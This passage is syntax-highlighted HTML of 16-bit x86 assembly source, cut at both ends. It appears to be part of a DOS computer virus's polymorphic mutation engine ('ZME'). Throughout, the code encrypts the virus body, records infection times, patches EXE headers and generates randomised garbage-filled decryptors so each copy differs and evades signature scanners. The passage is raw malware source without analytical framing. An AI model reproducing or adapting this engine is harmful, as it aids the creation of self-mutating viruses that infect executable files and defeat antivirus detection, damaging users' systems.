    </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">

</span><span class="sc1">;int 2bh</span><span class="sc0">
</span><span class="sc1">;    movseg  ds, cs</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RANDOMIZE</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._exehdr.exe_len_mod_512</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exe_rle_table</span><span class="sc4">-</span><span class="sc5">exe_len_mod_512</span><span class="sc0"> </span><span class="sc1">;14h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.zmefl</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">zmeflHDR</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ZME_crypt_custom</span><span class="sc0">
</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">ZME_crypt</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.zmefl</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">_____</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_INIT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_cur_time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">last_infect_time</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_data</span><span class="sc4">-</span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc0"> </span><span class="sc1">;virus_size</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">ZME_crypt_custom</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.datasize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.targetptr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">          </span><span class="sc1">;copy data</span><span class="sc0">
    </span><span class="sc1">;&lt; set next version probabilitys [di-virs-VIRUSSTACKSIZE+prEXE]</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.jmp_after_decrypt</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.cur_cryptlevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ZME_crypt_</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ZME_crypt_</span><span class="sc0"> </span><span class="sc1">;;;double crypt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.targetptr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.jmp_after_decrypt</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.datasize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">ZME_crypt_</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_BFR_GARBL</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.datasize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">shit_ax</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">;   ZME_INIT</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._engdata.cJMP_patch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reg6</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">segm_IDT</span><span class="sc0">                </span><span class="sc1">; clear the work area with 0's</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">bad_reg</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">010b</span><span class="sc0">     </span><span class="sc1">;AL := R_DX, R_BX, R_SI, R_DI</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">R_DX</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">                 </span><span class="sc1">; not R_DX</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._engdata.reg0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">ffound</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._engdata.reg0</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">fill_registers</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc5">EXIT</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">R_SP</span><span class="sc0">
            </span><span class="sc9">REPEAT</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">fill_registers</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">ffound</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">         </span><span class="sc1">; X &lt; decriptor_data + initialIP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.value_X</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; or X &gt; decriptor_data+initialIP+datasize+2</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_BYTE</span><span class="sc0">         </span><span class="sc1">; Y &lt; decriptor_data + initialIP - X</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.value_Y</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; or Y &gt; decriptor_data+initialIP+datasize+2-X</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.datasize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">101b</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.value_J</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;value_J := 1..datasize-0E</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.targetptr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;    cmp    byte ptr [engdata.zmefl+1], (zmeflOBJ shr 8) and 0FFh</span><span class="sc0">
</span><span class="sc1">;    DOIF E</span><span class="sc0">
</span><span class="sc1">;        lea si, PMtest</span><span class="sc0">
</span><span class="sc1">;        mov cx, 0Fh</span><span class="sc0">
</span><span class="sc1">;        rep movsb</span><span class="sc0">
</span><span class="sc1">;    DONE</span><span class="sc0">

</span><span class="sc1">;IRP foo, &lt;50,B8,86,16,CD,2F,58,75,06,5F,55,8B,EC,FF,E7&gt;</span><span class="sc0">
</span><span class="sc1">;sto_byte 0&amp;foo&amp;h</span><span class="sc0">
</span><span class="sc1">;ENDM</span><span class="sc0">

</span><span class="sc1">;store test for PM</span><span class="sc0">
</span><span class="sc1">;mov    ax,1600 (1686)  ; 0B8h, 86h, 16h, 0CDh, 2Fh, 75,</span><span class="sc0">
</span><span class="sc1">;int    2f</span><span class="sc0">
</span><span class="sc1">;cmp    ax,1600</span><span class="sc0">
</span><span class="sc1">;je     real</span><span class="sc0">
</span><span class="sc1">;pop    di</span><span class="sc0">
</span><span class="sc1">;push   bp</span><span class="sc0">
</span><span class="sc1">;mov    bp,sp</span><span class="sc0">
</span><span class="sc1">;jmp    di</span><span class="sc0">
</span><span class="sc1">;real:</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_SAVE_REGS</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">USE_PUSHA</span><span class="sc0">
    </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opPUSHA</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._engdata.reg0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opPUSH_AX</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">REG_GARBL_ALL</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">force_not_branch_garble</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">EN_BFR_GARBL</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EN_BFR_GARBL</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_BFR_GARBL</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more_reg_all</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_int21</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;    ENCODE_CRYPT_ROUTINE</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.useregs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">REG_GARBL_ALL</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.begin_sub</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;DON'T ENCODE CALL BACKWARD INTO DECRYPTOR</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dataencriptor</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRYPTLEVEL</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">opNOP</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">opRETN</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">engdata.zmeflags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_RELOCATOR</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NZ</span><span class="sc0">                 </span><span class="sc1">; encode relocator</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opCALL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.relocator_base</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SHIT_AX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.reg0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opPOP_AX</span><span class="sc0"> </span><span class="sc1">;pop r0</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">garble_more</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_reloc_patch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.reloff_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_reloc_patch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.reloff_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.reg0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_zero_reg</span><span class="sc0">      </span><span class="sc1">;encode MOV IDX ,0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.reg2</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;encode MOV TMP1, some</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_mov</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.start_reg2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.reg3</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;encode MOV TMP2, some</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_mov</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.start_reg3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">engdata.loop_top</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">   </span><span class="sc1">;loop peak</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.value_X</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_add</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">garble_more</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; 87 or 8B</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_reg_mem</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.value_X</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">;-(X+1)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.reloff_1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encode_mem_access</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">engdata.cur_cryptlevel</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0"> </span><span class="sc1">;mask ?</span><span class="sc0">
